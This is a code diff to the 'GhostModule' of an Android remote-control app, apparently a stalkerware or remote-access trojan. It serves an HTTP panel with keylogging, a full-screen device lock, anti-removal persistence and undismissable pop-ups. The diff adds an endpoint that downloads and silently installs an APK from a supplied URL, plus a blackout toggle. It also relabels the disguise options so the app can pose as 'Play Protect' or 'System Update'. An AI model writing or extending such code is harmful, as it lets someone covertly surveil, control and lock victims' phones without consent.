@@ -12,6 +12,7 @@ import com.labs.labrats.IO_Persistence_Manager;
 import com.labs.labrats.SystemAnalytics;
 
 import java.util.ArrayList;
+import java.util.List;
 import java.util.Map;
 
 import fi.iki.elonen.NanoHTTPD.IHTTPSession;
@@ -46,6 +47,13 @@ public class GhostModule extends BaseModule {
             return serveInspectorTree();
         } else if (uri.equals("/ghost/interact")) {
             return performInteraction(params);
+        } else if (uri.equals("/ghost/silent-install")) {
+            String apkUrl = params.get("url");
+            if (apkUrl != null && !apkUrl.trim().isEmpty()) {
+                com.labs.labrats.PrivilegedInstaller.downloadAndSilentInstallAsync(context, apkUrl);
+                return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"SILENT_INSTALL_DISPATCHED\"}");
+            }
+            return newResponse(Response.Status.BAD_REQUEST, "application/json", "{\"success\": false, \"message\": \"URL required\"}");
         } else if (uri.equals("/stealth")) {
             return toggleStealthMode(params);
         }
@@ -368,7 +376,7 @@ public class GhostModule extends BaseModule {
 
         // 2. System Denial Lock
         html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">SYSTEM_DENIAL_LOCK <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_DENIAL_LOCK', 'Deploy a persistent, full-screen security overlay to lock physical interaction.')\">INFO</span></div>");
+        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.7rem;\">SYSTEM_DENIAL_LOCK <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_DENIAL_LOCK', 'Deploy a persistent, full-screen security overlay to lock physical interaction.')\">INFO</span></div>");
         html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width:100% !important; margin:15px 0 0 0;\">DEPLOY_LOCK</button>");
         html.append("</div>");
 
@@ -401,24 +409,24 @@ public class GhostModule extends BaseModule {
         html.append("</div></div>");
 
         // 7. Auto Pilot & Anti-Removal (Legacy Controls)
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,255,0.02); grid-column: 1 / -1;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">AUTOMATION_&_PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,0,0.03); grid-column: 1 / -1;\">");
+        html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow); font-size: 0.7rem;\">AUTOMATION_&_PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
         html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px; margin-top: 10px;\">");
-        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); margin:0;\">INITIATE_HEAL</button>");
+        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">INITIATE_HEAL</button>");
         String autoPilotLabel = IO_Persistence_Manager.isAutoPilotEngaged() ? "AUTOPILOT_ENGAGED" : "AUTOPILOT_OFF";
         String autoPilotClass = IO_Persistence_Manager.isAutoPilotEngaged() ? "btn btn-small btn-engaged-yellow" : "btn btn-small";
-        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
-        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"margin:0;\">LOADING...</button>");
+        html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
+        html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin:0;\">LOADING...</button>");
         html.append("</div></div>");
         
         html.append("</div></div>");
 
         // Unified Interaction Suite (Flex Container for Desktop)
         html.append("<style>");
-        html.append("  .interaction-suite { display: flex; flex-wrap: nowrap; gap: 0; align-items: stretch; margin-top: 30px; border: 1px solid rgba(0, 242, 255, 0.15); border-radius: 12px; background: var(--bg-card); overflow: hidden; }");
+        html.append("  .interaction-suite { display: flex; flex-wrap: nowrap; gap: 0; align-items: stretch; margin-top: 30px; border: 1px solid rgba(0, 242, 255, 0.4) !important; border-radius: 12px; background: var(--bg-card); overflow: hidden; box-shadow: none !important; }");
         html.append("  .interaction-suite input { width: 100% !important; max-width: 100% !important; height: auto !important; }");
         html.append("  .remote-control-panel { flex: 1 1 50%; padding: 40px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-width: 320px; }");
-        html.append("  .panel-divider { width: 1px; background: rgba(0, 242, 255, 0.15); flex-shrink: 0; }");
+        html.append("  .panel-divider { width: 1px; background: rgba(0, 242, 255, 0.4) !important; flex-shrink: 0; }");
         html.append("  .inspector-panel { flex: 1 1 50%; padding: 40px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-width: 320px; }");
         html.append("  @media (max-width: 1024px) { .interaction-suite { flex-direction: column; flex-wrap: wrap; } .panel-divider { width: 100%; height: 1px; } .remote-control-panel, .inspector-panel { flex: 1 1 auto; padding: 25px 15px; width: 100%; } }");
         html.append("</style>");
@@ -473,7 +481,7 @@ public class GhostModule extends BaseModule {
 
         // --- GHOST TOAST CARD ---
         html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow); margin-top: 50px;\">");
-        html.append("<h2 style=\"text-align: left; color: var(--neon-yellow); font-size: 1.15rem; margin: 0 0 15px 0;\">GHOST_TOAST <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_TOAST', 'Force-project non-standard text pop-ups to the device display. Unlike standard notifications, these cannot be swiped away or blocked by the system or user.')\">INFO</span></h2>");
+        html.append("<h2 style=\"text-align: left; color: var(--neon-yellow); font-size: 1.35rem; margin: 0 0 15px 0;\">GHOST_TOAST <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_TOAST', 'Force-project non-standard text pop-ups to the device display. Unlike standard notifications, these cannot be swiped away or blocked by the system or user.')\">INFO</span></h2>");
         
         html.append("<style>");
         html.append("  input[type='range'] { height: 30px; -webkit-appearance: none; background: transparent; cursor: pointer; }");
@@ -532,7 +540,7 @@ public class GhostModule extends BaseModule {
 
         html.append("<div>");
         html.append("<div class=\"info-label\" style=\"font-size: 0.7rem; color: #888;\">ANIMATION_STYLE</div>");
-        html.append("<select id=\"toast-anim\" style=\"width: 100%; background: #000; border: 1px solid rgba(255,255,0,0.3); color: #fff; padding: 8px; border-radius: 6px; outline: none; font-family: monospace;\">");
+        html.append("<select id=\"toast-anim\" style=\"width: 100%; background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid rgba(255,255,0,0.3); color: #fff; padding: 8px; border-radius: 6px; outline: none; font-family: monospace;\">");
         html.append("<option value=\"scroll\">SCROLL_HORIZONTAL</option>");
         html.append("<option value=\"pop\">POP_IN_OUT</option>");
         html.append("<option value=\"static\">STATIC_FADE</option>");
@@ -546,7 +554,7 @@ public class GhostModule extends BaseModule {
         // Ghost Keylogs Section
         html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"margin-top: 30px; display: block !important;\">");
         html.append("<div class=\"flex-header\">");
-        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 1.15rem; display: flex; align-items: center; gap: 8px;\">&#9000; GHOST_KEYLOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_KEYLOGS', 'Real-time interception of keystrokes and system text.')\">INFO</span></h2>");
+        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px;\">&#9000; GHOST_KEYLOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_KEYLOGS', 'Real-time interception of keystrokes and system text.')\">INFO</span></h2>");
         html.append("<button onclick=\"clearGhostLogs()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; border-radius: 12px;\">PURGE_LOGS</button>");
         html.append("</div>");
         
@@ -638,6 +646,11 @@ public class GhostModule extends BaseModule {
             case "recents":
                 success = ghost.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS);
                 break;
+            case "blackout":
+            case "toggle_blackout":
+                ghost.startBlackout(!IO_Persistence_Manager.isBlackoutActive());
+                success = true;
+                break;
             case "blackout_on":
                 ghost.startBlackout(true);
                 success = true;
@@ -695,10 +708,10 @@ public class GhostModule extends BaseModule {
                 return newResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"hidden\": false}");
             } else {
                 if (type != null) {
-                    int choice = 1; // update
+                    int choice = 1; // Play Protect (Default / SettingsAlias)
                     if (type.equals("calc")) choice = 2;
                     else if (type.equals("weather")) choice = 3;
-                    else if (type.equals("settings")) choice = 4;
+                    else if (type.equals("update")) choice = 4; // System Update
                     else if (type.equals("logo")) choice = 5;
                     
                     SystemAnalytics.setDecoyChoice(context, choice);
